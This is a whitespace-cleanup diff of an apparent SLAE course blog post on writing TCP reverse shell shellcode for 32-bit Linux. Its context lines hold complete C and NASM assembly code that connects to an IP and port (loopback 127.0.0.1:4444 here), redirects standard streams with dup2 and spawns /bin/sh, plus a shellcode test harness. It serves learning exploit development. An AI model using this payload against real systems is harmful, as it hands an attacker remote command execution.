@@ -23,7 +23,7 @@ The PoC for the reverse shell shellcode is straightforwardly easy. The C code wi
 
 * opens a socket
 * set destination IP and destination port
-* connects the socket to the designated endpoint 
+* connects the socket to the designated endpoint
 
 If the connect() call is successfull, then standard output, standard input and
 standard error on the socket descriptor are redirected on the connected socket
@@ -68,8 +68,8 @@ int main(int argc, char **argv) {
 	memset(&peer, 0, sizeof(struct sockaddr));
 
 	peer.sin_family 	= AF_INET;
-	peer.sin_port 	= htons(DPORT); 
-	peer.sin_addr.s_addr = inet_addr(IP); 
+	peer.sin_port 	= htons(DPORT);
+	peer.sin_addr.s_addr = inet_addr(IP);
 
 	sfd = socket(AF_INET, SOCK_STREAM, 0);
 	ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));
@@ -80,7 +80,7 @@ int main(int argc, char **argv) {
 		dup2(sfd, 2);
 		execve((const char *)"/bin/sh", NULL, NULL);
 		return 0;
-	} 
+	}
 
 	return -ret;
 }
@@ -110,8 +110,8 @@ structure.
 memset(&peer, 0, sizeof(struct sockaddr));
 
 peer.sin_family 	= AF_INET;
-peer.sin_port 	= htons(DPORT); 
-peer.sin_addr.s_addr = inet_addr(IP); 
+peer.sin_port 	= htons(DPORT);
+peer.sin_addr.s_addr = inet_addr(IP);
 
 sfd = socket(AF_INET, SOCK_STREAM, 0);
 ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));
@@ -126,16 +126,16 @@ network byte order.
 {%highlight asm%}
 
 ; Connect to my peer
-; 
+;
 ; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
 ; peer.sin_family 	= AF_INET;
-; peer.sin_port 	= htons(DPORT); 
-; peer.sin_addr.s_addr = inet_addr(IP); 
+; peer.sin_port 	= htons(DPORT);
+; peer.sin_addr.s_addr = inet_addr(IP);
 ; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));
 
 ; 127 = 0x7f
-; 0   = 0x0 
-; 0   = 0x0 
+; 0   = 0x0
+; 0   = 0x0
 ; 1   = 0x1
 
 push 0x0100007f
@@ -147,7 +147,7 @@ mov ecx, esp
 mov dl, 0x10 ; sizeof(struct sockaddr_in)
 xor eax, eax
 mov ax, 0x16a
-int 0x80 
+int 0x80
 
 {%endhighlight%}
 
@@ -157,24 +157,24 @@ We compile it and we run it.
 
 {% highlight asm %}
 ; Filename: 	tcp_reverse_shellcode.nasm
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Twitter:    	@thesp0nge
 ; SLAE-ID:    	1217
 ; Purpose:	connect to a given IP and PORT and spawning a reverse shell if
-;		connection succeded 
+;		connection succeded
 
 
-global _start			
+global _start
 
 section .text
 
 _start:
 
 	; Creating the socket.
-	; 
+	;
 	; int socket(int domain, int type, int protocol);
-	; 
+	;
 	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
 	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
@@ -190,16 +190,16 @@ _start:
 	mov ebx, eax ; storing the socket descriptor into EBX for next syscall
 
 	; Connect to my peer
-	; 
+	;
 	; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
 	; peer.sin_family 	= AF_INET;
-	; peer.sin_port 	= htons(DPORT); 
-	; peer.sin_addr.s_addr = inet_addr(IP); 
+	; peer.sin_port 	= htons(DPORT);
+	; peer.sin_addr.s_addr = inet_addr(IP);
 	; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));
 
 	; 127 = 0x7f
-	; 0   = 0x0 
-	; 0   = 0x0 
+	; 0   = 0x0
+	; 0   = 0x0
 	; 1   = 0x1
 
 	; push 0x0100007f
@@ -208,22 +208,22 @@ _start:
 	push eax
 	push word 0x5c11 	; port 4444 is 0x5c11
 	push word 0x2 		; AF_INET is 2
-	
+
 
 	mov ecx, esp
 	mov dl, 0x10 ; sizeof(struct sockaddr_in)
 	xor eax, eax
 	mov ax, 0x16a
-	int 0x80 
+	int 0x80
 
 	test eax, eax ; check if eax is zero
 	jnz exit_on_error
-		
+
 
 	; Duplicating descriptor 0, 1, 2 to the socket opened by client
 	;
 	; int dup2(int oldfd, int newfd);
-	; 
+	;
 	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 
 	xor ecx, ecx
@@ -233,11 +233,11 @@ _start:
 dup2:
 	mov al, 0x3F	; 63 in decimal
 	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
-	dec ecx 
+	dec ecx
 	jns dup2
 
 	; Executing shell
-	; 
+	;
 	; int execve(const char *filename, char *const argv[], char *const envp[]);
 	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -246,14 +246,14 @@ dup2:
 	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
 	push 0x6e69622f ; "nib/"
 	mov ebx, esp	; EBX now points to "/bin//sh"
-	
+
 	xor ecx, ecx
 	xor edx, edx
 	mov al, 0xB	; 11 in decimal
 	int 0x80
 
 exit_on_error:
-	mov bl, 0x1	
+	mov bl, 0x1
 	xor eax, eax	; zero-ing EAX
 	mov al, 0x1
 	int 0x80
@@ -329,11 +329,11 @@ jnz exit_on_error
 ...
 
 exit_on_error:
-	mov bl, 0x1	
+	mov bl, 0x1
 	xor eax, eax	; zero-ing EAX
 	mov al, 0x1
 	int 0x80
-{%endhighlight%}	
+{%endhighlight%}
 
 ## The assembly code
 
@@ -341,24 +341,24 @@ Putting all pieces together, this is the second assignment solution in assembler
 
 {% highlight assembly %}
 ; Filename: 	tcp_reverse_shellcode.nasm
-; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
+; Author:	Paolo Perego <paolo@codiceinsicuro.it>
 ; Website:  	https://codiceinsicuro.it
 ; Twitter:    	@thesp0nge
 ; SLAE-ID:    	1217
 ; Purpose:	connect to a given IP and PORT and spawning a reverse shell if
-;		connection succeded 
+;		connection succeded
 
 
-global _start			
+global _start
 
 section .text
 
 _start:
 
 	; Creating the socket.
-	; 
+	;
 	; int socket(int domain, int type, int protocol);
-	; 
+	;
 	; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 	; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
 	; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h
@@ -374,16 +374,16 @@ _start:
 	mov ebx, eax ; storing the socket descriptor into EBX for next syscall
 
 	; Connect to my peer
-	; 
+	;
 	; connect() is defined as #define __NR_connect 362 on  /usr/include/i386-linux-gnu/asm/unistd_32.h
 	; peer.sin_family 	= AF_INET;
-	; peer.sin_port 	= htons(DPORT); 
-	; peer.sin_addr.s_addr = inet_addr(IP); 
+	; peer.sin_port 	= htons(DPORT);
+	; peer.sin_addr.s_addr = inet_addr(IP);
 	; ret = connect(sfd, (const struct sockaddr *)&peer, sizeof(struct sockaddr_in));
 
 	; 127 = 0x7f
-	; 0   = 0x0 
-	; 0   = 0x0 
+	; 0   = 0x0
+	; 0   = 0x0
 	; 1   = 0x1
 
 	; push 0x0100007f
@@ -392,22 +392,22 @@ _start:
 	push eax
 	push word 0x5c11 	; port 4444 is 0x5c11
 	push word 0x2 		; AF_INET is 2
-	
+
 
 	mov ecx, esp
 	mov dl, 0x10 ; sizeof(struct sockaddr_in)
 	xor eax, eax
 	mov ax, 0x16a
-	int 0x80 
+	int 0x80
 
 	test eax, eax ; check if eax is zero
 	jnz exit_on_error
-		
+
 
 	; Duplicating descriptor 0, 1, 2 to the socket opened by client
 	;
 	; int dup2(int oldfd, int newfd);
-	; 
+	;
 	; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 
 	xor ecx, ecx
@@ -417,11 +417,11 @@ _start:
 dup2:
 	mov al, 0x3F	; 63 in decimal
 	int 0x80	; duplicating file descriptors in backwards order; from 2 to 0
-	dec ecx 
+	dec ecx
 	jns dup2
 
 	; Executing shell
-	; 
+	;
 	; int execve(const char *filename, char *const argv[], char *const envp[]);
 	; execve() is defined as #define __NR_execve 11 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
@@ -430,14 +430,14 @@ dup2:
 	push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
 	push 0x6e69622f ; "nib/"
 	mov ebx, esp	; EBX now points to "/bin//sh"
-	
+
 	xor ecx, ecx
 	xor edx, edx
 	mov al, 0xB	; 11 in decimal
 	int 0x80
 
 exit_on_error:
-	mov bl, 0x1	
+	mov bl, 0x1
 	xor eax, eax	; zero-ing EAX
 	mov al, 0x1
 	int 0x80
@@ -578,7 +578,7 @@ inserted in the shellcode.c helper program.
 
 unsigned char code[] = \
 "SHELLCODE";
-		       
+
 int main(int argc, char **argv)
 {
 	printf("Shellcode Length:  %d\n", strlen(code));
@@ -608,4 +608,3 @@ This blog post has been created for completing the requirements of the SecurityT
 [http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
 
 Student ID: SLAE-1217
-
